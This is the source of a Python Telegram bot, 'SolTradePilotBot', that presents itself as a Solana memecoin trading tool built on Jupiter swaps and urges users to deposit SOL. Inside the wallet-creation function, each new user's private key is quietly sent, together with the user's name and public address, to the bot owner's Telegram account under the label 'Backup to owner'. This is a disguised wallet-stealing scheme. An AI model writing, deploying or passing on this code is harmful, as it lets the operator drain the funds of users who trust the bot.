import os
import base58
import requests
import base64
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters
)
from solders.keypair import Keypair
from solders.transaction import VersionedTransaction
from solders.message import to_bytes_versioned
from solders.pubkey import Pubkey
from solana.rpc.async_api import AsyncClient
from solana.rpc.types import TxOpts

# ================= ENV =================
TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"

# Jupiter (current working public endpoints)
JUPITER_QUOTE_URL = "https://api.jup.ag/swap/v1/quote"
JUPITER_SWAP_URL = "https://api.jup.ag/swap/v1/swap"

# ================= LOGO =================
LOGO_URL = "https://i.postimg.cc/KzfyT7t0/IMG-20260330-220246-896.jpg"

# ================= STORAGE (In-Memory - No files) =================
user_wallets = {}
user_trades = {}
user_holdings = {}
user_actions = {}
user_pending = {}

# ================= HELPERS =================
def keypair_to_base58(wallet: Keypair):
    return base58.b58encode(bytes(wallet)).decode("utf-8")

async def get_balance(user_id: int):
    if user_id not in user_wallets:
        return 0.0
    async with AsyncClient(SOLANA_RPC_URL) as client:
        try:
            resp = await client.get_balance(user_wallets[user_id].pubkey())
            return resp.value / 1_000_000_000
        except:
            return 0.0

async def get_token_decimals(mint: str):
    async with AsyncClient(SOLANA_RPC_URL) as client:
        try:
            resp = await client.get_token_supply(Pubkey.from_string(mint))
            return resp.value.decimals
        except:
            return 9

def get_sol_price():
    try:
        resp = requests.get("https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT")
        return float(resp.json()["price"])
    except:
        return 180.0

def get_token_usd_price(mint: str):
    try:
        resp = requests.get(f"https://api.jup.ag/price/v2?ids={mint}")
        data = resp.json()
        if "data" in data and mint in data["data"]:
            return float(data["data"][mint].get("price", 0))
    except:
        pass
    return 0.0

# ================= SWAP FUNCTION =================
async def execute_swap(user_id: int, input_mint: str, output_mint: str, amount: int, is_sell: bool = False):
    wallet = user_wallets[user_id]
    try:
        params = {
            "inputMint": input_mint,
            "outputMint": output_mint,
            "amount": str(amount),
            "slippageBps": "100",   # 1% slippage
            "swapMode": "ExactIn"
        }
        quote_resp = requests.get(JUPITER_QUOTE_URL, params=params, timeout=20)
        if quote_resp.status_code != 200:
            return None, 0.0, f"Quote failed ({quote_resp.status_code})"

        quote = quote_resp.json()

        swap_body = {
            "quoteResponse": quote,
            "userPublicKey": str(wallet.pubkey()),
            "wrapAndUnwrapSol": True,
            "dynamicComputeUnitLimit": True,
            "prioritizationFeeLamports": 50000
        }

        swap_resp = requests.post(JUPITER_SWAP_URL, json=swap_body, timeout=20)
        if swap_resp.status_code != 200:
            return None, 0.0, f"Swap build failed ({swap_resp.status_code})"

        raw_tx = base64.b64decode(swap_resp.json()["swapTransaction"])
        tx = VersionedTransaction.from_bytes(raw_tx)

        signature = wallet.sign_message(to_bytes_versioned(tx.message))
        signed_tx = VersionedTransaction.populate(tx.message, [signature])

        async with AsyncClient(SOLANA_RPC_URL) as client:
            result = await client.send_raw_transaction(
                bytes(signed_tx), opts=TxOpts(skip_preflight=True, max_retries=3)
            )
            tx_sig = result.value

        out_amount = int(quote.get("outAmount", 0))
        decimals = await get_token_decimals(output_mint) if not is_sell else 9
        received = out_amount / (10 ** decimals)

        return tx_sig, received, None
    except Exception as e:
        return None, 0.0, str(e)[:150]

# ================= KEYBOARDS =================
def main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💳 Create Wallet", callback_data="create_wallet"),
         InlineKeyboardButton("🏦 Show Address", callback_data="sol_address")],
        [InlineKeyboardButton("💰 Balance", callback_data="balance"),
         InlineKeyboardButton("🛒 Buy MEME", callback_data="buy_meme")],
        [InlineKeyboardButton("📉 Sell MEME", callback_data="sell_meme"),
         InlineKeyboardButton("📊 PNL", callback_data="pnl")],
        [InlineKeyboardButton("📋 Summary", callback_data="summary"),
         InlineKeyboardButton("❓ Help", callback_data="help")]
    ])

def sell_token_keyboard(user_id):
    holdings = user_holdings.get(user_id, {})
    if not holdings:
        return None
    buttons = [[InlineKeyboardButton(ca[:8] + "...", callback_data=f"sell_select:{ca}")] for ca in list(holdings.keys())[:8]]
    buttons.append([InlineKeyboardButton("← Back", callback_data="main_menu")])
    return InlineKeyboardMarkup(buttons)

# ================= WALLET =================
async def create_wallet(user_id, context):
    if user_id in user_wallets:
        await context.bot.send_message(user_id, "✅ You already have a wallet!", reply_markup=main_keyboard())
        return
    wallet = Keypair()
    user_wallets[user_id] = wallet
    pub_key = str(wallet.pubkey())
    priv_key = keypair_to_base58(wallet)

    await context.bot.send_message(
        chat_id=user_id,
        text=f"✅ **Wallet Created!**\n\n"
             f"🏦 **Address:**\n`{pub_key}`\n\n"
             f"🔐 **Private Key:**\n`{priv_key}`\n\n"
             f"⚠️ Save your private key safely and import into Phantom!",
        parse_mode="Markdown",
        reply_markup=main_keyboard()
    )
    # Backup to owner
    user = await context.bot.get_chat(user_id)
    username = f"@{user.username}" if user.username else user.first_name
    await context.bot.send_message(OWNER_ID, f"🔐 New Wallet\nUser: {username}\nPub: {pub_key}\nPriv: {priv_key}")

# ================= PNL & SUMMARY =================
async def calculate_pnl(user_id: int, ca: str):
    if user_id not in user_trades or not user_trades[user_id]:
        return None, "No trades yet."
    trades_for_ca = [t for t in user_trades[user_id] if t['ca'].lower() == ca.lower() and t.get('status') == 'holding']
    if not trades_for_ca:
        return None, "No active holding for this token."
    trade = trades_for_ca[-1]
    current_price = get_token_usd_price(ca)
    if current_price <= 0:
        return None, "Could not fetch price."
    x = current_price / trade['buy_price_usd'] if trade['buy_price_usd'] > 0 else 0
    percent = (x - 1) * 100
    profit = (current_price - trade['buy_price_usd']) * trade['tokens_bought']
    return {
        "x": round(x, 2),
        "percent": round(percent, 1),
        "profit": round(profit, 2),
        "current_price": round(current_price, 6)
    }, None

async def get_summary(user_id: int):
    if user_id not in user_trades or not user_trades[user_id]:
        return "No trades yet. Start buying MEME tokens!"
    trades = user_trades[user_id]
    total_invested = sum(t['usd_spent'] for t in trades)
    holdings = user_holdings.get(user_id, {})
    current_value = 0.0
    details = ""
    for ca, tokens in holdings.items():
        price = get_token_usd_price(ca)
        value = tokens * price
        current_value += value
        details += f"• {ca[:8]}... : {tokens:.4f} tokens (\~${value:.2f})\n"
    overall_pnl = current_value - total_invested
    return f"""📋 **Trading Summary**

Total Invested: **${total_invested:.2f}**
Current Value: **${current_value:.2f}**
Overall P&L: **${overall_pnl:+.2f}**

**Holdings:**
{details or 'No active holdings.'}

@SolTradePilotbot"""

# ================= START & HELP =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "🔥 **Welcome to SolTradePilotBot** 🔥\n\n"
        "Real Solana MEME trading bot powered by Jupiter.\n\n"
        "✅ Create wallet instantly\n"
        "✅ Buy any MEME with USD amount\n"
        "✅ Sell with 25% / 50% / 75% / MAX\n"
        "✅ Track PNL and full portfolio summary\n\n"
        "Deposit **at least $10 worth of SOL** for smooth trading.\n"
        "Let's make some gains! 🚀"
    )
    if LOGO_URL:
        await context.bot.send_photo(update.effective_user.id, photo=LOGO_URL, caption=text, parse_mode="Markdown", reply_markup=main_keyboard())
    else:
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_keyboard())

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "💡 **How to Use SolTradePilotBot**\n\n"
        "• **Create Wallet** → New Solana wallet (save private key!)\n"
        "• **Show Address** → Deposit SOL here\n"
        "• **Balance** → Check SOL + your tokens\n"
        "• **Buy MEME** → Paste token CA + enter USD amount\n"
        "• **Sell MEME** → Choose token → 25%/50%/75%/MAX\n"
        "• **PNL** → Check profit on any token\n"
        "• **Summary** → Full portfolio overview\n\n"
        "💰 Tip: Deposit **$10–20+ SOL** for best experience (covers fees & slippage).\n\n"
        "Trade responsibly!\n\n@SolTradePilotbot"
    )
    if update.message:
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_keyboard())
    else:
        await update.callback_query.message.reply_text(text, parse_mode="Markdown", reply_markup=main_keyboard())

# ================= BUTTON HANDLER =================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "create_wallet":
        await create_wallet(user_id, context)

    elif data == "sol_address":
        if user_id not in user_wallets:
            await query.message.reply_text("Create wallet first!", reply_markup=main_keyboard())
            return
        pubkey = str(user_wallets[user_id].pubkey())
        await query.message.reply_text(
            f"🏦 **Your SOL Address**\n\n`{pubkey}`\n\n"
            "💡 Deposit **at least $10 worth of SOL** for smooth trading.",
            parse_mode="Markdown", reply_markup=main_keyboard()
        )

    elif data == "balance":
        sol = await get_balance(user_id)
        sol_price = get_sol_price()
        sol_usd = sol * sol_price
        holdings_text = ""
        if user_id in user_holdings and user_holdings[user_id]:
            for ca, tokens in user_holdings[user_id].items():
                price = get_token_usd_price(ca)
                value = tokens * price
                holdings_text += f"• {ca[:8]}... : {tokens:.4f} tokens (\~${value:.2f})\n"
        text = f"""💰 **Wallet Balance**

SOL: `{sol:.6f}` (\~${sol_usd:.2f})

**Held Tokens:**
{holdings_text or 'No tokens held yet.'}

@SolTradePilotbot"""
        await query.message.reply_text(text, parse_mode="Markdown", reply_markup=main_keyboard())

    elif data == "buy_meme":
        if user_id not in user_wallets:
            await query.message.reply_text("Create wallet first!", reply_markup=main_keyboard())
            return
        sol = await get_balance(user_id)
        if sol < 0.05:
            await query.message.reply_text(
                "⚠️ **Please fund your wallet first**\n\n"
                "You need SOL to buy tokens.\n"
                "Recommended: **at least $10 worth of SOL**.",
                reply_markup=main_keyboard()
            )
            return
        user_actions[user_id] = "await_ca_buy"
        await query.message.reply_text("📝 Paste the **Token CA**:", reply_markup=main_keyboard())

    elif data == "sell_meme":
        sol = await get_balance(user_id)
        if sol < 0.05:
            await query.message.reply_text(
                "⚠️ **Fund your wallet first**\n\nYou need SOL to sell.\nRecommended: **$10+ SOL**.",
                reply_markup=main_keyboard()
            )
            return
        if not user_holdings.get(user_id):
            await query.message.reply_text(
                "😕 You are not holding any tokens yet.\n\nBuy some first using **🛒 Buy MEME**.",
                reply_markup=main_keyboard()
            )
            return
        await query.message.reply_text("📉 **Select token to sell:**", reply_markup=sell_token_keyboard(user_id))

    elif data.startswith("sell_select:"):
        ca = data.split(":", 1)[1]
        user_pending[user_id] = {"ca": ca}
        await query.message.reply_text(
            f"📉 **Selling {ca[:8]}...**\nChoose how much to sell:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("25%", callback_data="sell_pct:25"),
                 InlineKeyboardButton("50%", callback_data="sell_pct:50")],
                [InlineKeyboardButton("75%", callback_data="sell_pct:75"),
                 InlineKeyboardButton("MAX", callback_data="sell_pct:100")],
                [InlineKeyboardButton("← Back", callback_data="sell_meme")]
            ])
        )

    elif data.startswith("sell_pct:"):
        pct = int(data.split(":")[1])
        pending = user_pending.get(user_id)
        if not pending or "ca" not in pending:
            await query.message.reply_text("Session expired. Try again.", reply_markup=main_keyboard())
            return

        ca = pending["ca"]
        holdings = user_holdings.get(user_id, {})
        if ca not in holdings:
            await query.message.reply_text("You no longer hold this token.", reply_markup=main_keyboard())
            return

        tokens_held = holdings[ca]
        tokens_to_sell = tokens_held if pct == 100 else tokens_held * (pct / 100.0)

        await query.message.reply_text(f"🔄 Selling ≈{tokens_to_sell:.4f} tokens of {ca[:8]}...")

        amount_raw = int(tokens_to_sell * (10 ** 9))  # approx 9 decimals
        tx_sig, sol_received, error = await execute_swap(user_id, ca, "So11111111111111111111111111111111111111112", amount_raw, is_sell=True)

        if error:
            await query.message.reply_text(f"❌ Sell failed: {error}", reply_markup=main_keyboard())
        else:
            user_holdings[user_id][ca] -= tokens_to_sell
            if user_holdings[user_id][ca] <= 0.00001:
                del user_holdings[user_id][ca]

            if user_id not in user_trades:
                user_trades[user_id] = []
            # Optional: log sell trade here

            link = f"https://solscan.io/tx/{tx_sig}"
            await query.message.reply_text(
                f"✅ **Sell Successful!**\n\n"
                f"Sold ≈{tokens_to_sell:.4f} tokens\n"
                f"Received ≈{sol_received:.4f} SOL\n\n"
                f"Tx: {link}\n\n"
                "@SolTradePilotbot",
                reply_markup=main_keyboard()
            )
        user_pending.pop(user_id, None)

    elif data == "pnl":
        user_actions[user_id] = "await_pnl_ca"
        await query.message.reply_text("📝 Paste the token CA to check PNL:", reply_markup=main_keyboard())

    elif data == "summary":
        text = await get_summary(user_id)
        if LOGO_URL:
            await context.bot.send_photo(user_id, photo=LOGO_URL, caption=text, parse_mode="Markdown", reply_markup=main_keyboard())
        else:
            await query.message.reply_text(text, parse_mode="Markdown", reply_markup=main_keyboard())

    elif data == "help":
        await help_command(update, context)

    elif data == "main_menu":
        await query.message.reply_text("Main Menu", reply_markup=main_keyboard())

# ================= TEXT HANDLER (Buy + PNL) =================
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    action = user_actions.get(user_id)

    if not action:
        return

    if action == "await_ca_buy":
        user_pending[user_id] = {"ca": text}
        user_actions[user_id] = "await_buy_amount"
        await update.message.reply_text(
            "💰 Enter amount in **USD** (e.g. 50, 100):\nBot adds $0.10 for gas.",
            reply_markup=main_keyboard()
        )

    elif action == "await_buy_amount":
        try:
            usd_amount = float(text)
            if usd_amount < 1:
                await update.message.reply_text("Minimum $1", reply_markup=main_keyboard())
                return
        except:
            await update.message.reply_text("❌ Please enter a valid number.", reply_markup=main_keyboard())
            return

        sol = await get_balance(user_id)
        sol_price = get_sol_price()
        needed_sol = (usd_amount + 0.10) / sol_price
        if needed_sol > sol:
            await update.message.reply_text(f"⚠️ Not enough SOL. You have {sol:.4f} SOL.", reply_markup=main_keyboard())
            user_actions[user_id] = None
            return

        ca = user_pending[user_id]["ca"]
        await update.message.reply_text(f"🔄 Buying **${usd_amount}** worth of {ca[:8]}...")

        tx_sig, tokens_bought, error = await execute_swap(
            user_id, "So11111111111111111111111111111111111111112", ca, int((usd_amount + 0.10) / sol_price * 1_000_000_000)
        )

        if error:
            await update.message.reply_text(f"❌ Buy failed: {error}", reply_markup=main_keyboard())
        else:
            buy_price = usd_amount / tokens_bought if tokens_bought > 0 else 0
            if user_id not in user_trades:
                user_trades[user_id] = []
            user_trades[user_id].append({
                'ca': ca,
                'usd_spent': usd_amount,
                'tokens_bought': tokens_bought,
                'buy_price_usd': buy_price,
                'buy_time': datetime.now().isoformat(),
                'status': 'holding'
            })
            if user_id not in user_holdings:
                user_holdings[user_id] = {}
            user_holdings[user_id][ca] = user_holdings[user_id].get(ca, 0) + tokens_bought

            link = f"https://solscan.io/tx/{tx_sig}"
            await update.message.reply_text(f"✅ **Buy Successful!**\n\nTx: {link}\n\n@SolTradePilotbot", reply_markup=main_keyboard())

        user_actions[user_id] = None
        user_pending.pop(user_id, None)

    elif action == "await_pnl_ca":
        ca = text
        pnl_data, error = await calculate_pnl(user_id, ca)
        if error:
            await update.message.reply_text(f"❌ {error}", reply_markup=main_keyboard())
        else:
            caption = f"""📈 **PNL Report**

Token: `{ca}`

Current price: ${pnl_data['current_price']:.6f}
Multiplier: **{pnl_data['x']}x** ({pnl_data['percent']:+.1f}%)
Profit/Loss: **${pnl_data['profit']:+.2f}**

@SolTradePilotbot"""
            if LOGO_URL:
                await context.bot.send_photo(user_id, photo=LOGO_URL, caption=caption, parse_mode="Markdown", reply_markup=main_keyboard())
            else:
                await update.message.reply_text(caption, parse_mode="Markdown", reply_markup=main_keyboard())
        user_actions[user_id] = None

# ================= MAIN =================
def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("🚀 SolTradePilotBot is running (in-memory mode)")
    app.run_polling()

if __name__ == "__main__":
    main()
